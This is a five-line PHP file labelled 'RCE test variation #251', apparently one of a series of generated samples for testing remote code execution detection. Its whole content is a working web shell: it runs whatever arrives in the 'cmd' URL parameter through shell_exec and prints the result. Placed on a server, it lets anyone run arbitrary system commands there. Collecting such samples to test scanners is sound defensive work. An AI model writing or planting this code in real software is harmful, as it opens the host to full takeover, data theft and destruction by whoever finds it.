<?php
// RCE test variation #251
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>